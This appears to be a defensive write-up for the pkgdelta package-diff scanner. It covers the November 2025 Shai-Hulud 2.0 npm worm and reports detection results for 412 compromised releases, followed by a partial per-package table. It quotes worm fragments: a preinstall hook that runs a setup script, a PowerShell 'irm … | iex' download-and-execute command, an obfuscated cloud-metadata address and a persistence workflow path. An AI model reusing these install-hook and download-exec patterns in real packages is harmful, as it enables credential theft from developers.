# Shai-Hulud 2.0 npm worm (November 2025, Postman, PostHog, AsyncAPI): detection results and how to check your lockfile

On 24 November 2025 the second Shai-Hulud wave hit npm: `@postman/tunnel-agent`, `@voiceflow/*`, `@asyncapi/*`, `@posthog/*`, `@ensdomains/*`, `@actbase/*` and hundreds more. The DataDog dataset has 412 of those releases with a clean earlier version. pkgdelta blocks all 412; GuardDog flags all 411 it could scan.

This is training data: the rules were written while looking at it. See [TanStack / Mini Shai-Hulud](tanstack-mini-shai-hulud.md) and [ChainDrop](chaindrop-keyv.md) for blind tests on the same family.

[Am I affected?](#am-i-affected) · [What changed](#what-changed-compared-with-the-previous-release) · [Numbers](#detection-results)

## What happened

The second wave moved from `postinstall` to `preinstall`, so it runs even when the install fails later. `preinstall: node setup_bun.js` installs the Bun runtime (`curl … | bash`, or `irm bun.sh/install.ps1 | iex` on Windows) and uses it to run `bun_environment.js`, a multi-megabyte obfuscated file. That file steals npm, GitHub and cloud credentials, publishes them to new public GitHub repositories with the description "Sha1-Hulud: The Second Coming", adds a `.github/workflows/discussion.yaml` workflow as a backdoor, and republishes the victim's other packages the same way.

Running the payload under Bun instead of Node means a tool that watches `node` processes sees only a short setup script. The same Bun-download step shows up again in 2026: [Bitwarden CLI](bitwarden-cli.md), [SAP cap-js](sap-cap-js.md), [ChainDrop](chaindrop-keyv.md).

## What changed compared with the previous release

pkgdelta's findings for `@postman/tunnel-agent` 0.6.4 → 0.6.5 (from `results/v2_train.jsonl`, low-severity lines left out):

```
BLOCK @postman/tunnel-agent 0.6.4 -> 0.6.5  (score 22)
        HIGH install-hook: preinstall script added: node setup_bun.js [package.json]
        HIGH new-capability:token_tools: code starts using token tools (previous version never did) [bun_environment.js]
             _0x114e65[_0xfefb98(0x3372)]='http://169.254.169.254'
        HIGH new-capability:download_exec: code starts using download exec (previous version never did) [bun_environment.js]
             command = 'powershell -c "irm bun.sh/install.ps1|iex"';
        HIGH new-capability:persistence: code starts using persistence (previous version never did) [bun_environment.js]
             '.github/workflows/discussion.yaml'
        HIGH obfuscation: obfuscated code appears (previous version had none) [bun_environment.js]
      MEDIUM new-capability:credential_paths, env_dump
```

pkgdelta reads the obfuscated file as text and still finds the metadata IP and the workflow path, because obfuscators hide logic, not string constants.

## Detection results

<!-- numbers:start -->
| | Releases | pkgdelta v1 (frozen) | pkgdelta v2 | GuardDog `high_risk` | GuardDog, any `threat-*` rule |
|---|---|---|---|---|---|
| Blocked | 412 | 412 / 412 (100%) | 412 / 412 (100%) | 411 / 411 (100%) | 411 / 411 (100%) |

Findings in these releases (pkgdelta v2, medium and high only; count = releases):

- `install-hook` (high): 412
- `new-capability:download_exec` (high): 412
- `obfuscation` (high): 412
- `new-capability:credential_paths` (medium): 410
- `new-capability:token_tools` (high): 410
- `new-capability:persistence` (high): 404
- `new-capability:env_dump` (medium): 399
- `provenance-dropped` (medium): 3

<details><summary>All 412 releases (baseline = the clean release it was compared with)</summary>

| Package | Bad version | Baseline | OSV | pkgdelta v2 | GuardDog |
|---|---|---|---|---|---|
| `02-echo` | 0.0.7 | 0.0.6 | [MAL-2025-191025](https://osv.dev/vulnerability/MAL-2025-191025) | BLOCK (21) | high_risk |
| `@accordproject/concerto-linter-default-ruleset` | 3.24.1 | 3.24.0 | [MAL-2025-191173](https://osv.dev/vulnerability/MAL-2025-191173) | BLOCK (21) | high_risk |
| `@accordproject/concerto-metamodel` | 3.12.5 | 3.12.4 | [MAL-2025-191174](https://osv.dev/vulnerability/MAL-2025-191174) | BLOCK (21) | high_risk |
| `@accordproject/concerto-types` | 3.24.1 | 3.24.0 | [MAL-2025-191175](https://osv.dev/vulnerability/MAL-2025-191175) | BLOCK (22) | high_risk |
| `@accordproject/markdown-it-cicero` | 0.16.26 | 0.16.25 | [MAL-2025-191176](https://osv.dev/vulnerability/MAL-2025-191176) | BLOCK (22) | high_risk |
| `@accordproject/template-engine` | 2.7.2 | 2.7.1 | [MAL-2025-191177](https://osv.dev/vulnerability/MAL-2025-191177) | BLOCK (19) | high_risk |
| `@actbase/css-to-react-native-transform` | 1.0.3 | 1.0.2 | [MAL-2025-190706](https://osv.dev/vulnerability/MAL-2025-190706) | BLOCK (22) | high_risk |
| `@actbase/native` | 0.1.32 | 0.1.31 | [MAL-2025-191178](https://osv.dev/vulnerability/MAL-2025-191178) | BLOCK (22) | high_risk |
| `@actbase/node-server` | 1.1.19 | 1.1.18 | [MAL-2025-190707](https://osv.dev/vulnerability/MAL-2025-190707) | BLOCK (20) | high_risk |
| `@actbase/react-absolute` | 0.8.3 | 0.8.2 | [MAL-2025-190790](https://osv.dev/vulnerability/MAL-2025-190790) | BLOCK (22) | high_risk |
| `@actbase/react-daum-postcode` | 1.0.5 | 1.0.4 | [MAL-2025-190708](https://osv.dev/vulnerability/MAL-2025-190708) | BLOCK (22) | high_risk |
| `@actbase/react-kakaosdk` | 0.9.27 | 0.9.26 | [MAL-2025-190791](https://osv.dev/vulnerability/MAL-2025-190791) | BLOCK (22) | high_risk |
| `@actbase/react-native-actionsheet` | 1.0.3 | 1.0.2 | [MAL-2025-190792](https://osv.dev/vulnerability/MAL-2025-190792) | BLOCK (22) | high_risk |
| `@actbase/react-native-devtools` | 0.1.3 | 0.1.2 | [MAL-2025-190793](https://osv.dev/vulnerability/MAL-2025-190793) | BLOCK (22) | high_risk |
| `@actbase/react-native-fast-image` | 8.5.13 | 8.5.12 | [MAL-2025-190709](https://osv.dev/vulnerability/MAL-2025-190709) | BLOCK (22) | high_risk |
| `@actbase/react-native-kakao-channel` | 1.0.2 | 1.0.1 | [MAL-2025-190794](https://osv.dev/vulnerability/MAL-2025-190794) | BLOCK (22) | high_risk |
| `@actbase/react-native-kakao-navi` | 2.0.4 | 2.0.3 | [MAL-2025-190795](https://osv.dev/vulnerability/MAL-2025-190795) | BLOCK (22) | high_risk |
| `@actbase/react-native-less-transformer` | 1.0.6 | 1.0.5 | [MAL-2025-190710](https://osv.dev/vulnerability/MAL-2025-190710) | BLOCK (22) | high_risk |
| `@actbase/react-native-naver-login` | 1.0.1 | 1.0.0 | [MAL-2025-190711](https://osv.dev/vulnerability/MAL-2025-190711) | BLOCK (22) | high_risk |
| `@actbase/react-native-simple-video` | 1.0.13 | 1.0.12 | [MAL-2025-190796](https://osv.dev/vulnerability/MAL-2025-190796) | BLOCK (22) | high_risk |
| `@actbase/react-native-tiktok` | 1.1.3 | 1.1.2 | [MAL-2025-190712](https://osv.dev/vulnerability/MAL-2025-190712) | BLOCK (22) | high_risk |
| `@alexcolls/nuxt-socket.io` | 0.0.8 | 0.0.6 | [MAL-2025-191185](https://osv.dev/vulnerability/MAL-2025-191185) | BLOCK (21) | high_risk |
| `@alexcolls/nuxt-ux` | 0.6.2 | 0.6.0 | [MAL-2025-191186](https://osv.dev/vulnerability/MAL-2025-191186) | BLOCK (21) | high_risk |
| `@antstackio/eslint-config-antstack` | 0.0.3 | 0.0.2 | [MAL-2025-191187](https://osv.dev/vulnerability/MAL-2025-191187) | BLOCK (22) | high_risk |
| `@antstackio/express-graphql-proxy` | 0.2.8 | 0.2.7 | [MAL-2025-191188](https://osv.dev/vulnerability/MAL-2025-191188) | BLOCK (22) | high_risk |
| `@antstackio/graphql-body-parser` | 0.1.1 | 0.1.0 | [MAL-2025-191189](https://osv.dev/vulnerability/MAL-2025-191189) | BLOCK (22) | high_risk |
| `@antstackio/json-to-graphql` | 1.0.3 | 1.0.2 | [MAL-2025-191190](https://osv.dev/vulnerability/MAL-2025-191190) | BLOCK (22) | high_risk |
| `@antstackio/shelbysam` | 1.1.7 | 1.1.6 | [MAL-2025-191191](https://osv.dev/vulnerability/MAL-2025-191191) | BLOCK (22) | high_risk |
| `@aryanhussain/my-angular-lib` | 0.0.23 | 0.0.22 | [MAL-2025-190713](https://osv.dev/vulnerability/MAL-2025-190713) | BLOCK (21) | high_risk |
| `@asyncapi/avro-schema-parser` | 3.0.26 | 3.0.24 | [MAL-2025-190635](https://osv.dev/vulnerability/MAL-2025-190635) | BLOCK (21) | high_risk |
| `@asyncapi/bundler` | 0.6.6 | 0.6.4 | [MAL-2025-190652](https://osv.dev/vulnerability/MAL-2025-190652) | BLOCK (21) | high_risk |
| `@asyncapi/cli` | 4.1.3 | 4.1.1 | [MAL-2025-190653](https://osv.dev/vulnerability/MAL-2025-190653) | BLOCK (20) | high_risk |
| `@asyncapi/converter` | 1.6.4 | 1.6.2 | [MAL-2025-190654](https://osv.dev/vulnerability/MAL-2025-190654) | BLOCK (21) | high_risk |
| `@asyncapi/diff` | 0.5.1 | 0.5.0 | [MAL-2025-190655](https://osv.dev/vulnerability/MAL-2025-190655) | BLOCK (21) | high_risk |
| `@asyncapi/generator` | 2.8.6 | 2.8.4 | [MAL-2025-190636](https://osv.dev/vulnerability/MAL-2025-190636) | BLOCK (21) | high_risk |
| `@asyncapi/generator-components` | 0.3.3 | 0.3.1 | [MAL-2025-190656](https://osv.dev/vulnerability/MAL-2025-190656) | BLOCK (21) | high_risk |
| `@asyncapi/generator-helpers` | 0.2.2 | 0.2.0 | [MAL-2025-190657](https://osv.dev/vulnerability/MAL-2025-190657) | BLOCK (21) | high_risk |
| `@asyncapi/generator-react-sdk` | 1.1.4 | 1.1.3 | [MAL-2025-190637](https://osv.dev/vulnerability/MAL-2025-190637) | BLOCK (21) | high_risk |
| `@asyncapi/html-template` | 3.3.2 | 3.3.1 | [MAL-2025-190658](https://osv.dev/vulnerability/MAL-2025-190658) | BLOCK (20) | high_risk |
| `@asyncapi/java-spring-template` | 1.6.2 | 1.6.0 | [MAL-2025-190716](https://osv.dev/vulnerability/MAL-2025-190716) | BLOCK (21) | high_risk |
| `@asyncapi/java-template` | 0.3.5 | 0.3.4 | [MAL-2025-190717](https://osv.dev/vulnerability/MAL-2025-190717) | BLOCK (21) | high_risk |
| `@asyncapi/keeper` | 0.0.3 | 0.0.1 | [MAL-2025-190799](https://osv.dev/vulnerability/MAL-2025-190799) | BLOCK (21) | high_risk |
| `@asyncapi/markdown-template` | 1.6.8 | 1.6.7 | [MAL-2025-190659](https://osv.dev/vulnerability/MAL-2025-190659) | BLOCK (21) | high_risk |
| `@asyncapi/modelina` | 5.10.2 | 5.10.1 | [MAL-2025-190638](https://osv.dev/vulnerability/MAL-2025-190638) | BLOCK (21) | high_risk |
| `@asyncapi/modelina` | 5.10.3 | 5.10.1 | [MAL-2025-190638](https://osv.dev/vulnerability/MAL-2025-190638) | BLOCK (21) | high_risk |
| `@asyncapi/multi-parser` | 2.2.2 | 2.2.0 | [MAL-2025-190661](https://osv.dev/vulnerability/MAL-2025-190661) | BLOCK (21) | high_risk |
| `@asyncapi/nodejs-template` | 3.0.5 | 3.0.4 | [MAL-2025-190718](https://osv.dev/vulnerability/MAL-2025-190718) | BLOCK (21) | high_risk |
| `@asyncapi/nunjucks-filters` | 2.1.2 | 2.1.0 | [MAL-2025-190662](https://osv.dev/vulnerability/MAL-2025-190662) | BLOCK (21) | high_risk |
| `@asyncapi/openapi-schema-parser` | 3.0.26 | 3.0.24 | [MAL-2025-190639](https://osv.dev/vulnerability/MAL-2025-190639) | BLOCK (21) | high_risk |
| `@asyncapi/optimizer` | 1.0.6 | 1.0.4 | [MAL-2025-190663](https://osv.dev/vulnerability/MAL-2025-190663) | BLOCK (21) | high_risk |
| `@asyncapi/parser` | 3.4.1 | 3.4.0 | [MAL-2025-190640](https://osv.dev/vulnerability/MAL-2025-190640) | BLOCK (20) | high_risk |
| `@asyncapi/parser` | 3.4.2 | 3.4.0 | [MAL-2025-190640](https://osv.dev/vulnerability/MAL-2025-190640) | BLOCK (20) | high_risk |
| `@asyncapi/php-template` | 0.1.1 | 0.1.0 | [MAL-2025-190800](https://osv.dev/vulnerability/MAL-2025-190800) | BLOCK (21) | high_risk |
| `@asyncapi/problem` | 1.0.1 | 1.0.0 | [MAL-2025-190664](https://osv.dev/vulnerability/MAL-2025-190664) | BLOCK (21) | high_risk |
| `@asyncapi/protobuf-schema-parser` | 3.5.2 | 3.5.1 | [MAL-2025-190641](https://osv.dev/vulnerability/MAL-2025-190641) | BLOCK (21) | high_risk |
| `@asyncapi/protobuf-schema-parser` | 3.5.3 | 3.5.1 | [MAL-2025-190641](https://osv.dev/vulnerability/MAL-2025-190641) | BLOCK (21) | high_risk |
| `@asyncapi/python-paho-template` | 0.2.14 | 0.2.13 | [MAL-2025-190720](https://osv.dev/vulnerability/MAL-2025-190720) | BLOCK (21) | high_risk |
| `@asyncapi/react-component` | 2.6.7 | 2.6.5 | [MAL-2025-190642](https://osv.dev/vulnerability/MAL-2025-190642) | BLOCK (20) | high_risk |
| `@asyncapi/server-api` | 0.16.24 | 0.16.23 | [MAL-2025-190801](https://osv.dev/vulnerability/MAL-2025-190801) | BLOCK (21) | high_risk |
| `@asyncapi/specs` | 6.10.1 | 6.10.0 | [MAL-2025-190643](https://osv.dev/vulnerability/MAL-2025-190643) | BLOCK (20) | high_risk |
| `@asyncapi/specs` | 6.8.2 | 6.8.1 | [MAL-2025-190643](https://osv.dev/vulnerability/MAL-2025-190643) | BLOCK (20) | high_risk |
| `@asyncapi/specs` | 6.8.3 | 6.8.1 | [MAL-2025-190643](https://osv.dev/vulnerability/MAL-2025-190643) | BLOCK (20) | high_risk |
| `@asyncapi/studio` | 1.0.2 | 1.0.1 | [MAL-2025-190863](https://osv.dev/vulnerability/MAL-2025-190863) | BLOCK (17) | high_risk |
| `@asyncapi/studio` | 1.0.3 | 1.0.1 | [MAL-2025-190863](https://osv.dev/vulnerability/MAL-2025-190863) | BLOCK (17) | high_risk |
| `@browserbasehq/bb9` | 1.2.21 | 1.2.20 | [MAL-2025-191193](https://osv.dev/vulnerability/MAL-2025-191193) | BLOCK (21) | high_risk |
| `@browserbasehq/director-ai` | 1.0.3 | 1.0.2 | [MAL-2025-191194](https://osv.dev/vulnerability/MAL-2025-191194) | BLOCK (22) | high_risk |
| `@browserbasehq/mcp` | 2.1.1 | 2.1.0 | [MAL-2025-191195](https://osv.dev/vulnerability/MAL-2025-191195) | BLOCK (22) | high_risk |
| `@browserbasehq/sdk-functions` | 0.0.4 | 0.0.3 | [MAL-2025-191197](https://osv.dev/vulnerability/MAL-2025-191197) | BLOCK (21) | high_risk |
| `@browserbasehq/stagehand` | 3.0.4 | 3.0.3 | [MAL-2025-191198](https://osv.dev/vulnerability/MAL-2025-191198) | BLOCK (18) | high_risk |
| `@clausehq/flows-step-mqtt` | 0.1.14 | 0.1.13 | [MAL-2025-191203](https://osv.dev/vulnerability/MAL-2025-191203) | BLOCK (21) | high_risk |
| `@clausehq/flows-step-sendgridemail` | 0.1.14 | 0.1.13 | [MAL-2025-191204](https://osv.dev/vulnerability/MAL-2025-191204) | BLOCK (21) | high_risk |
| `@clausehq/flows-step-taskscreateurl` | 0.1.14 | 0.1.13 | [MAL-2025-191205](https://osv.dev/vulnerability/MAL-2025-191205) | BLOCK (21) | high_risk |
| `@dev-blinq/cucumber-js` | 1.0.131 | 1.0.130 | [MAL-2025-191212](https://osv.dev/vulnerability/MAL-2025-191212) | BLOCK (21) | high_risk |
| `@dev-blinq/cucumber_client` | 1.0.738 | 1.0.735 | [MAL-2025-191213](https://osv.dev/vulnerability/MAL-2025-191213) | BLOCK (18) | high_risk |
| `@ensdomains/address-encoder` | 1.1.5 | 1.1.4 | [MAL-2025-190665](https://osv.dev/vulnerability/MAL-2025-190665) | BLOCK (22) | high_risk |
| `@ensdomains/blacklist` | 1.0.1 | 1.0.0 | [MAL-2025-190722](https://osv.dev/vulnerability/MAL-2025-190722) | BLOCK (22) | high_risk |
| `@ensdomains/ccip-read-dns-gateway` | 0.1.1 | 0.1.0 | [MAL-2025-190723](https://osv.dev/vulnerability/MAL-2025-190723) | BLOCK (22) | high_risk |
| `@ensdomains/ccip-read-worker-viem` | 0.0.4 | 0.0.3 | [MAL-2025-190725](https://osv.dev/vulnerability/MAL-2025-190725) | BLOCK (22) | high_risk |
| `@ensdomains/curvearithmetics` | 1.0.1 | 1.0.0 | [MAL-2025-190726](https://osv.dev/vulnerability/MAL-2025-190726) | BLOCK (22) | high_risk |
| `@ensdomains/cypress-metamask` | 1.2.1 | 1.2.0-development | [MAL-2025-190803](https://osv.dev/vulnerability/MAL-2025-190803) | BLOCK (22) | high_risk |
| `@ensdomains/ensjs` | 4.0.3 | 4.0.2 | [MAL-2025-190933](https://osv.dev/vulnerability/MAL-2025-190933) | BLOCK (23) | high_risk |
| `@ensdomains/hardhat-chai-matchers-viem` | 0.1.15 | 0.1.14 | [MAL-2025-190733](https://osv.dev/vulnerability/MAL-2025-190733) | BLOCK (22) | high_risk |
| `@ensdomains/hardhat-toolbox-viem-extended` | 0.0.6 | 0.0.5 | [MAL-2025-190734](https://osv.dev/vulnerability/MAL-2025-190734) | BLOCK (22) | high_risk |
| `@ensdomains/react-ens-address` | 0.0.32 | 0.0.31 | [MAL-2025-190809](https://osv.dev/vulnerability/MAL-2025-190809) | BLOCK (22) | high_risk |
| `@ensdomains/renewal` | 0.0.13 | 0.0.12 | [MAL-2025-190810](https://osv.dev/vulnerability/MAL-2025-190810) | BLOCK (22) | high_risk |
| `@ensdomains/server-analytics` | 0.0.2 | 0.0.1 | [MAL-2025-190811](https://osv.dev/vulnerability/MAL-2025-190811) | BLOCK (22) | high_risk |
| `@ensdomains/subdomain-registrar` | 0.2.4 | 0.2.3 | [MAL-2025-190812](https://osv.dev/vulnerability/MAL-2025-190812) | BLOCK (22) | high_risk |
| `@ensdomains/test-utils` | 1.3.1 | 1.3.0 | [MAL-2025-190738](https://osv.dev/vulnerability/MAL-2025-190738) | BLOCK (22) | high_risk |
| `@ensdomains/thorin` | 0.6.51 | 0.6.50 | [MAL-2025-190739](https://osv.dev/vulnerability/MAL-2025-190739) | BLOCK (20) | high_risk |
| `@ensdomains/ui` | 3.4.6 | 3.4.5 | [MAL-2025-190813](https://osv.dev/vulnerability/MAL-2025-190813) | BLOCK (22) | high_risk |
| `@ensdomains/vite-plugin-i18next-loader` | 4.0.4 | 4.0.3 | [MAL-2025-190741](https://osv.dev/vulnerability/MAL-2025-190741) | BLOCK (22) | high_risk |
| `@ensdomains/web3modal` | 1.10.2 | 1.10.1 | [MAL-2025-190815](https://osv.dev/vulnerability/MAL-2025-190815) | BLOCK (22) | high_risk |
| `@everreal/validate-esmoduleinterop-imports` | 1.4.4 | 1.4.3 | [MAL-2025-191216](https://osv.dev/vulnerability/MAL-2025-191216) | BLOCK (20) | high_risk |
| `@everreal/validate-esmoduleinterop-imports` | 1.4.5 | 1.4.3 | [MAL-2025-191216](https://osv.dev/vulnerability/MAL-2025-191216) | BLOCK (20) | high_risk |
| `@faq-component/core` | 0.0.4 | 0.0.3 | [MAL-2025-191218](https://osv.dev/vulnerability/MAL-2025-191218) | BLOCK (21) | high_risk |
| `@faq-component/react` | 1.0.1 | 1.0.0 | [MAL-2025-191219](https://osv.dev/vulnerability/MAL-2025-191219) | BLOCK (21) | high_risk |
| `@hapheus/n8n-nodes-pgp` | 1.5.1 | 1.5.0 | [MAL-2025-191225](https://osv.dev/vulnerability/MAL-2025-191225) | BLOCK (21) | high_risk |
| `@hover-design/core` | 0.0.1 | 0.0.1-beta | [MAL-2025-191226](https://osv.dev/vulnerability/MAL-2025-191226) | BLOCK (21) | high_risk |
| `@ifelsedeveloper/protocol-contracts-svm-idl` | 0.1.2 | 0.1.1 | [MAL-2025-191235](https://osv.dev/vulnerability/MAL-2025-191235) | BLOCK (21) | high_risk |
| `@kvytech/cli` | 0.0.7 | 0.0.6 | [MAL-2025-190742](https://osv.dev/vulnerability/MAL-2025-190742) | BLOCK (21) | high_risk |
| `@kvytech/components` | 0.0.2 | 0.0.1 | [MAL-2025-190743](https://osv.dev/vulnerability/MAL-2025-190743) | BLOCK (22) | high_risk |
| `@kvytech/habbit-e2e-test` | 0.0.2 | 0.0.1 | [MAL-2025-191239](https://osv.dev/vulnerability/MAL-2025-191239) | BLOCK (22) | high_risk |
| `@kvytech/medusa-plugin-announcement` | 0.0.8 | 0.0.7 | [MAL-2025-190744](https://osv.dev/vulnerability/MAL-2025-190744) | BLOCK (21) | high_risk |
| `@kvytech/medusa-plugin-management` | 0.0.5 | 0.0.4 | [MAL-2025-190745](https://osv.dev/vulnerability/MAL-2025-190745) | BLOCK (21) | high_risk |
| `@kvytech/medusa-plugin-newsletter` | 0.0.5 | 0.0.4 | [MAL-2025-190816](https://osv.dev/vulnerability/MAL-2025-190816) | BLOCK (21) | high_risk |
| `@kvytech/medusa-plugin-product-reviews` | 0.0.9 | 0.0.8 | [MAL-2025-190746](https://osv.dev/vulnerability/MAL-2025-190746) | BLOCK (21) | high_risk |
| `@kvytech/medusa-plugin-promotion` | 0.0.2 | 0.0.1 | [MAL-2025-191240](https://osv.dev/vulnerability/MAL-2025-191240) | BLOCK (22) | high_risk |
| `@kvytech/web` | 0.0.2 | 0.0.1 | [MAL-2025-190747](https://osv.dev/vulnerability/MAL-2025-190747) | BLOCK (22) | high_risk |
| `@lessondesk/schoolbus` | 5.2.3 | 5.2.1 | [MAL-2025-191032](https://osv.dev/vulnerability/MAL-2025-191032) | BLOCK (21) | high_risk |
| `@markvivanco/app-version-checker` | 1.0.1 | 1.0.0 | [MAL-2025-190818](https://osv.dev/vulnerability/MAL-2025-190818) | BLOCK (21) | high_risk |
| `@markvivanco/app-version-checker` | 1.0.2 | 1.0.0 | [MAL-2025-190818](https://osv.dev/vulnerability/MAL-2025-190818) | BLOCK (21) | high_risk |
| `@mcp-use/cli` | 2.2.6 | 2.2.5 | [MAL-2025-190867](https://osv.dev/vulnerability/MAL-2025-190867) | BLOCK (20) | high_risk |
| `@mcp-use/cli` | 2.2.7 | 2.2.5 | [MAL-2025-190867](https://osv.dev/vulnerability/MAL-2025-190867) | BLOCK (20) | high_risk |
| `@mcp-use/inspector` | 0.6.2 | 0.6.1 | [MAL-2025-190868](https://osv.dev/vulnerability/MAL-2025-190868) | BLOCK (16) | high_risk |
| `@mcp-use/inspector` | 0.6.3 | 0.6.1 | [MAL-2025-190868](https://osv.dev/vulnerability/MAL-2025-190868) | BLOCK (16) | high_risk |
| `@mcp-use/mcp-use` | 1.0.1 | 1.0.0 | [MAL-2025-190869](https://osv.dev/vulnerability/MAL-2025-190869) | BLOCK (22) | high_risk |
| `@mcp-use/mcp-use` | 1.0.2 | 1.0.0 | [MAL-2025-190869](https://osv.dev/vulnerability/MAL-2025-190869) | BLOCK (21) | high_risk |
| `@orbitgtbelgium/mapbox-gl-draw-cut-polygon-mode` | 2.0.5 | 2.0.4 | [MAL-2025-191045](https://osv.dev/vulnerability/MAL-2025-191045) | BLOCK (22) | high_risk |
| `@orbitgtbelgium/mapbox-gl-draw-scale-rotate-mode` | 1.1.1 | 1.1.0 | [MAL-2025-190668](https://osv.dev/vulnerability/MAL-2025-190668) | BLOCK (22) | high_risk |
| `@orbitgtbelgium/orbit-components` | 1.2.9 | 1.2.8 | [MAL-2025-190669](https://osv.dev/vulnerability/MAL-2025-190669) | BLOCK (22) | high_risk |
| `@orbitgtbelgium/time-slider` | 1.0.187 | 1.0.186 | [MAL-2025-190670](https://osv.dev/vulnerability/MAL-2025-190670) | BLOCK (22) | high_risk |
| `@osmanekrem/bmad` | 1.0.6 | 1.0.5 | [MAL-2025-191046](https://osv.dev/vulnerability/MAL-2025-191046) | BLOCK (19) | high_risk |
| `@osmanekrem/error-handler` | 1.2.2 | 1.2.1 | [MAL-2025-191047](https://osv.dev/vulnerability/MAL-2025-191047) | BLOCK (21) | high_risk |
| `@posthog/agent` | 1.24.1 | 1.24.0 | [MAL-2025-190748](https://osv.dev/vulnerability/MAL-2025-190748) | BLOCK (9) | high_risk |
| `@posthog/core` | 1.5.6 | 1.5.5 | [MAL-2025-190645](https://osv.dev/vulnerability/MAL-2025-190645) | BLOCK (18) | high_risk |
| `@posthog/currency-normalization-plugin` | 0.0.8 | 0.0.7 | [MAL-2025-190874](https://osv.dev/vulnerability/MAL-2025-190874) | BLOCK (21) | high_risk |
| `@posthog/databricks-plugin` | 0.0.8 | 0.0.7 | [MAL-2025-190876](https://osv.dev/vulnerability/MAL-2025-190876) | BLOCK (21) | high_risk |
| `@posthog/drop-events-on-property-plugin` | 0.0.8 | 0.0.7 | [MAL-2025-190946](https://osv.dev/vulnerability/MAL-2025-190946) | BLOCK (21) | high_risk |
| `@posthog/filter-out-plugin` | 0.0.8 | 0.0.7 | [MAL-2025-191290](https://osv.dev/vulnerability/MAL-2025-191290) | BLOCK (21) | high_risk |
| `@posthog/first-time-event-tracker` | 0.0.8 | 0.0.7 | [MAL-2025-190878](https://osv.dev/vulnerability/MAL-2025-190878) | BLOCK (21) | high_risk |
| `@posthog/heartbeat-plugin` | 0.0.8 | 0.0.7 | [MAL-2025-191291](https://osv.dev/vulnerability/MAL-2025-191291) | BLOCK (21) | high_risk |
| `@posthog/hedgehog-mode` | 0.0.42 | 0.0.41 | [MAL-2025-190882](https://osv.dev/vulnerability/MAL-2025-190882) | BLOCK (21) | high_risk |
| `@posthog/maxmind-plugin` | 0.1.6 | 0.1.5 | [MAL-2025-190885](https://osv.dev/vulnerability/MAL-2025-190885) | BLOCK (22) | high_risk |
| `@posthog/nextjs` | 0.0.3 | 0.0.2 | [MAL-2025-190886](https://osv.dev/vulnerability/MAL-2025-190886) | BLOCK (20) | high_risk |
| `@posthog/pagerduty-plugin` | 0.0.8 | 0.0.7 | [MAL-2025-190888](https://osv.dev/vulnerability/MAL-2025-190888) | BLOCK (21) | high_risk |
| `@posthog/piscina` | 3.2.1 | 3.2.0-posthog | [MAL-2025-190750](https://osv.dev/vulnerability/MAL-2025-190750) | BLOCK (21) | high_risk |
| `@posthog/plugin-server` | 1.10.8 | 1.10.7 | [MAL-2025-190947](https://osv.dev/vulnerability/MAL-2025-190947) | BLOCK (22) | high_risk |
| `@posthog/postgres-plugin` | 0.0.8 | 0.0.7 | [MAL-2025-191298](https://osv.dev/vulnerability/MAL-2025-191298) | BLOCK (21) | high_risk |
| `@posthog/rrweb` | 0.0.31 | 0.0.30 | [MAL-2025-190673](https://osv.dev/vulnerability/MAL-2025-190673) | BLOCK (21) | high_risk |
| `@posthog/rrweb-player` | 0.0.31 | 0.0.30 | [MAL-2025-190891](https://osv.dev/vulnerability/MAL-2025-190891) | BLOCK (21) | high_risk |
| `@posthog/rrweb-record` | 0.0.31 | 0.0.30 | [MAL-2025-190752](https://osv.dev/vulnerability/MAL-2025-190752) | BLOCK (21) | high_risk |
| `@posthog/rrweb-replay` | 0.0.19 | 0.0.18 | [MAL-2025-191299](https://osv.dev/vulnerability/MAL-2025-191299) | BLOCK (21) | high_risk |
| `@posthog/taxonomy-plugin` | 0.0.8 | 0.0.7 | [MAL-2025-190894](https://osv.dev/vulnerability/MAL-2025-190894) | BLOCK (21) | high_risk |
| `@posthog/twitter-followers-plugin` | 0.0.8 | 0.0.7 | [MAL-2025-190896](https://osv.dev/vulnerability/MAL-2025-190896) | BLOCK (21) | high_risk |
| `@posthog/variance-plugin` | 0.0.8 | 0.0.7 | [MAL-2025-190898](https://osv.dev/vulnerability/MAL-2025-190898) | BLOCK (14) | high_risk |
| `@posthog/web-dev-server` | 1.0.5 | 1.0.4 | [MAL-2025-190899](https://osv.dev/vulnerability/MAL-2025-190899) | BLOCK (22) | high_risk |
| `@posthog/wizard` | 1.18.1 | 1.18.0 | [MAL-2025-190900](https://osv.dev/vulnerability/MAL-2025-190900) | BLOCK (17) | high_risk |
| `@postman/csv-parse` | 4.0.4 | 4.0.2 | [MAL-2025-190646](https://osv.dev/vulnerability/MAL-2025-190646) | BLOCK (21) | high_risk |
| `@postman/csv-parse` | 4.0.5 | 4.0.2 | [MAL-2025-190646](https://osv.dev/vulnerability/MAL-2025-190646) | BLOCK (21) | high_risk |
| `@postman/final-node-keytar` | 7.9.1 | 7.9.0 | [MAL-2025-190901](https://osv.dev/vulnerability/MAL-2025-190901) | BLOCK (22) | high_risk |
| `@postman/final-node-keytar` | 7.9.2 | 7.9.0 | [MAL-2025-190901](https://osv.dev/vulnerability/MAL-2025-190901) | BLOCK (21) | high_risk |
| `@postman/final-node-keytar` | 7.9.3 | 7.9.0 | [MAL-2025-190901](https://osv.dev/vulnerability/MAL-2025-190901) | BLOCK (21) | high_risk |
| `@postman/mcp-ui-client` | 5.5.1 | 5.5.0 | [MAL-2025-190902](https://osv.dev/vulnerability/MAL-2025-190902) | BLOCK (21) | high_risk |
| `@postman/mcp-ui-client` | 5.5.2 | 5.5.0 | [MAL-2025-190902](https://osv.dev/vulnerability/MAL-2025-190902) | BLOCK (20) | high_risk |
| `@postman/mcp-ui-client` | 5.5.3 | 5.5.0 | [MAL-2025-190902](https://osv.dev/vulnerability/MAL-2025-190902) | BLOCK (20) | high_risk |
| `@postman/node-keytar` | 7.9.4 | 7.9.3 | [MAL-2025-190754](https://osv.dev/vulnerability/MAL-2025-190754) | BLOCK (22) | high_risk |
| `@postman/node-keytar` | 7.9.5 | 7.9.3 | [MAL-2025-190754](https://osv.dev/vulnerability/MAL-2025-190754) | BLOCK (21) | high_risk |
| `@postman/node-keytar` | 7.9.6 | 7.9.3 | [MAL-2025-190754](https://osv.dev/vulnerability/MAL-2025-190754) | BLOCK (21) | high_risk |
| `@postman/pm-bin-linux-x64` | 1.24.3 | 1.24.2 | [MAL-2025-190903](https://osv.dev/vulnerability/MAL-2025-190903) | BLOCK (22) | high_risk |
| `@postman/pm-bin-linux-x64` | 1.24.4 | 1.24.2 | [MAL-2025-190903](https://osv.dev/vulnerability/MAL-2025-190903) | BLOCK (21) | high_risk |
